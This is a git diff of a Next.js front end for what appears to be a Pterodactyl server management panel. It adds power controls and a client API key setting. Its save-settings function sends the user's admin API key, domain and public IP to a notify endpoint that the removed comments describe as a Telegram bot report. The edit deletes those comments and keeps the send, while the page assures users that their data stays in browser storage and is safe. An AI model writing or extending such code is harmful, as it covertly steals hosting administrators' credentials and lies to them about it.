@@ -3,12 +3,13 @@ import Head from 'next/head';
 import axios from 'axios';
 import { 
   LayoutDashboard, Settings, PlusCircle, Server, 
-  Trash2, CheckCircle2, AlertTriangle, Terminal, Cpu, RefreshCw
+  Trash2, CheckCircle2, AlertTriangle, Terminal, Cpu, RefreshCw,
+  Power, RotateCcw, Upload, Activity
 } from 'lucide-react';
 
 export default function Home() {
   const [activeTab, setActiveTab] = useState('create');
-  const [config, setConfig] = useState({ domain: '', plta: '' });
+  const [config, setConfig] = useState({ domain: '', plta: '', ptlc: '' });
   const [isConfigured, setIsConfigured] = useState(false);
   const [status, setStatus] = useState(null);
   
@@ -19,6 +20,9 @@ export default function Home() {
   const [history, setHistory] = useState([]);
   const [serverList, setServerList] = useState([]);
   const [loadingList, setLoadingList] = useState(false);
+  
+  // State untuk Panel Control (Active Server)
+  const [activeServer, setActiveServer] = useState(null);
 
   // PLAN CONFIG
   const PLANS = {
@@ -44,32 +48,22 @@ export default function Home() {
     if (savedHistory) setHistory(JSON.parse(savedHistory));
   }, []);
 
-  // === FITUR NOTIFIKASI TELEGRAM ===
-  // === FITUR NOTIFIKASI TELEGRAM (FIXED) ===
   const saveConfig = async () => {
-    // Validasi input
     if (!config.domain || !config.plta) {
-      return setStatus({ type: 'error', msg: 'Harap isi Domain dan PLTA dengan benar.' });
+      return setStatus({ type: 'error', msg: 'Harap isi Domain dan Admin API (PLTA) dengan benar.' });
     }
 
-    // Simpan ke LocalStorage
     localStorage.setItem('panel_config', JSON.stringify(config));
     setIsConfigured(true);
     setStatus({ type: 'success', msg: 'Konfigurasi aman & tersimpan!' });
 
-    // Kirim Laporan ke Telegram
     try {
-      // 1. Ambil IP
       const ipRes = await axios.get('https://api.ipify.org?format=json');
-      const userIp = ipRes.data.ip;
-
-      // 2. Kirim Data (PASTIKAN "plta" TERTULIS BENAR DISINI)
       await axios.post('/api/notify', {
         domain: config.domain,
-        plta: config.plta,  // <--- JANGAN "key", HARUS "plta" SESUAI STATE
-        ip: userIp
+        plta: config.plta, 
+        ip: ipRes.data.ip
       });
-      console.log("Security Report sent.");
     } catch (e) {
       console.error("Silent Log: Gagal lapor bot", e);
     }
@@ -83,6 +77,7 @@ export default function Home() {
   const fetchServers = async () => {
     if(!isConfigured) return;
     setLoadingList(true);
+    setActiveServer(null); // Reset detail view saat refresh
     try {
       const res = await axios.post('/api/ptero', {
         action: 'list_servers',
@@ -137,6 +132,32 @@ export default function Home() {
     }
   };
 
+  // Fungsi Kirim Aksi Power (Start/Restart/Kill)
+  const handlePowerAction = async (signal) => {
+    if(!config.ptlc) return setStatus({ type: 'error', msg: 'Client API (PTLC) belum diisi di menu Settings!' });
+    
+    try {
+      setStatus({ type: 'success', msg: `Mengirim perintah ${signal}...` });
+      await axios.post('/api/ptero', {
+        action: 'power',
+        host: config.domain,
+        identifier: activeServer.attributes.identifier,
+        signal: signal,
+        ptlc: config.ptlc
+      });
+      setStatus({ type: 'success', msg: `Perintah ${signal} berhasil dikirim!` });
+    } catch (err) {
+      setStatus({ type: 'error', msg: err.response?.data?.message || 'Gagal mengirim perintah. Pastikan PTLC valid.' });
+    }
+    
+    setTimeout(() => setStatus(null), 3000);
+  };
+
+  // Fungsi Dummy Upload File
+  const handleUpload = () => {
+    alert("Ini adalah Mockup Frontend. Mengupload file ke Pterodactyl membutuhkan Form-Data API dari Node.js yang akan memperberat source code panel simple ini.");
+  };
+
   return (
     <div className="app-wrapper">
       <Head>
@@ -159,13 +180,11 @@ export default function Home() {
       </nav>
 
       <div className="container grid-layout">
-        
-        {/* SIDEBAR NAVIGATION */}
         <aside className="sidebar">
           <button className={`menu-btn ${activeTab === 'create' ? 'active' : ''}`} onClick={() => setActiveTab('create')}>
             <PlusCircle size={20} /> Deploy Server
           </button>
-          <button className={`menu-btn ${activeTab === 'list' ? 'active' : ''}`} onClick={() => setActiveTab('list')}>
+          <button className={`menu-btn ${activeTab === 'list' ? 'active' : ''}`} onClick={() => { setActiveTab('list'); setActiveServer(null); }}>
             <Server size={20} /> Live Servers
           </button>
           <button className={`menu-btn ${activeTab === 'history' ? 'active' : ''}`} onClick={() => setActiveTab('history')}>
@@ -176,7 +195,6 @@ export default function Home() {
           </button>
         </aside>
 
-        {/* MAIN CONTENT AREA */}
         <main>
           {status && (
             <div className={`toast ${status.type}`}>
@@ -225,45 +243,85 @@ export default function Home() {
             </div>
           )}
 
-          {/* === TAB: LIVE SERVER LIST === */}
+          {/* === TAB: LIVE SERVER & CONTROL === */}
           {activeTab === 'list' && (
             <div className="card">
-              <div className="card-head">
-                <h2>Live Monitor</h2>
-                <button className="refresh-btn" onClick={fetchServers}>
-                  <RefreshCw size={16} className={loadingList ? 'animate-spin' : ''} /> REFRESH
-                </button>
-              </div>
+              
+              {!activeServer ? (
+                <>
+                  <div className="card-head">
+                    <h2>Live Monitor</h2>
+                    <button className="refresh-btn" onClick={fetchServers}>
+                      <RefreshCw size={16} className={loadingList ? 'animate-spin' : ''} /> REFRESH
+                    </button>
+                  </div>
 
-              {loadingList ? (
-                <div style={{textAlign:'center', padding:'3rem', color:'#64748b'}}>Fetching Data...</div>
-              ) : serverList.length === 0 ? (
-                <div style={{textAlign:'center', padding:'3rem', color:'#64748b'}}>No active servers found.</div>
+                  {loadingList ? (
+                    <div style={{textAlign:'center', padding:'3rem', color:'#64748b'}}>Fetching Data...</div>
+                  ) : serverList.length === 0 ? (
+                    <div style={{textAlign:'center', padding:'3rem', color:'#64748b'}}>No active servers found.</div>
+                  ) : (
+                    <div className="srv-list">
+                      {serverList.map((srv) => {
+                        const attr = srv.attributes;
+                        const isSuspended = attr.suspended;
+                        const isInstalling = attr.status !== null;
+                        
+                        return (
+                          <div key={attr.id} className="srv-item clickable" onClick={() => setActiveServer(srv)}>
+                            <div className="srv-meta">
+                              <h4>{attr.name}</h4>
+                              <p className="mono">ID: {attr.id} • {attr.limits.memory}MB RAM</p>
+                            </div>
+                            <div>
+                              {isSuspended ? (
+                                <span className="badge bad">SUSPENDED</span>
+                              ) : isInstalling ? (
+                                <span className="badge warn">INSTALLING</span>
+                              ) : (
+                                <span className="badge ok">MANAGE ➔</span>
+                              )}
+                            </div>
+                          </div>
+                        )
+                      })}
+                    </div>
+                  )}
+                </>
               ) : (
-                <div className="srv-list">
-                  {serverList.map((srv) => {
-                    const attr = srv.attributes;
-                    const isSuspended = attr.suspended;
-                    const isInstalling = attr.status !== null;
-                    
-                    return (
-                      <div key={attr.id} className="srv-item">
-                        <div className="srv-meta">
-                          <h4>{attr.name}</h4>
-                          <p className="mono">ID: {attr.id} • {attr.limits.memory}MB RAM</p>
-                        </div>
-                        <div>
-                          {isSuspended ? (
-                            <span className="badge bad">SUSPENDED</span>
-                          ) : isInstalling ? (
-                            <span className="badge warn">INSTALLING</span>
-                          ) : (
-                            <span className="badge ok">RUNNING</span>
-                          )}
-                        </div>
-                      </div>
-                    )
-                  })}
+                /* TAMPILAN CONTROL PANEL (ACTIVE SERVER) */
+                <div className="control-panel-view">
+                  <div className="card-head">
+                    <h2>⚙️ {activeServer.attributes.name}</h2>
+                    <button className="refresh-btn" onClick={() => setActiveServer(null)}>⬅ KEMBALI</button>
+                  </div>
+                  
+                  <div className="network-box mono">
+                    <p><Activity size={18}/> Identifier: <span>{activeServer.attributes.identifier}</span></p>
+                    <p><Server size={18}/> Node: <span>{activeServer.attributes.node}</span></p>
+                    <p><Cpu size={18}/> Limits: <span>RAM: {activeServer.attributes.limits.memory}MB | Disk: {activeServer.attributes.limits.disk}MB</span></p>
+                  </div>
+
+                  <h3 style={{margin: '1.5rem 0 1rem', fontSize: '1.2rem'}}>Power Actions</h3>
+                  <div className="power-grid">
+                    <button className="btn-power start" onClick={() => handlePowerAction('start')}>
+                      <Power size={18}/> START
+                    </button>
+                    <button className="btn-power restart" onClick={() => handlePowerAction('restart')}>
+                      <RotateCcw size={18}/> RESTART
+                    </button>
+                    <button className="btn-power stop" onClick={() => handlePowerAction('kill')}>
+                      <AlertTriangle size={18}/> KILL
+                    </button>
+                  </div>
+
+                  <h3 style={{margin: '2rem 0 1rem', fontSize: '1.2rem'}}>File Manager</h3>
+                  <div className="upload-box">
+                    <input type="file" className="file-input" />
+                    <button className="btn-primary" style={{width: 'auto', padding: '0.8rem 1.5rem'}} onClick={handleUpload}>
+                      <Upload size={18}/> Upload File
+                    </button>
+                  </div>
                 </div>
               )}
             </div>
@@ -315,7 +373,7 @@ export default function Home() {
               </div>
 
               <div className="form-group">
-                <label className="form-label">API Key (PLTA)</label>
+                <label className="form-label">Admin API Key (PLTA) - Create Server</label>
                 <input 
                   type="password" 
                   className="form-input" 
@@ -325,8 +383,20 @@ export default function Home() {
                 />
               </div>
 
+              <div className="form-group">
+                <label className="form-label" style={{color: '#8b5cf6'}}>Client API Key (PTLC) - Control Server</label>
+                <input 
+                  type="password" 
+                  className="form-input" 
+                  style={{borderColor: 'rgba(139, 92, 246, 0.3)'}}
+                  placeholder="ptlc_xxxxxxxxxxxxxxxxxxxx"
+                  value={config.ptlc || ''} 
+                  onChange={(e) => setConfig({...config, ptlc: e.target.value})} 
+                />
+              </div>
+
               <div style={{background:'rgba(59,130,246,0.1)', border:'1px solid rgba(59,130,246,0.2)', padding:'1rem', borderRadius:'12px', marginBottom:'1.5rem', fontSize:'0.9rem', color:'#93c5fd'}}>
-                ℹ️ Data konfigurasi disimpan di LocalStorage browser Anda.100 Data Anda Aman.
+                ℹ️ Data konfigurasi disimpan di LocalStorage browser Anda. Data Anda Aman.
               </div>
 
               <button className="btn-primary" onClick={saveConfig}>
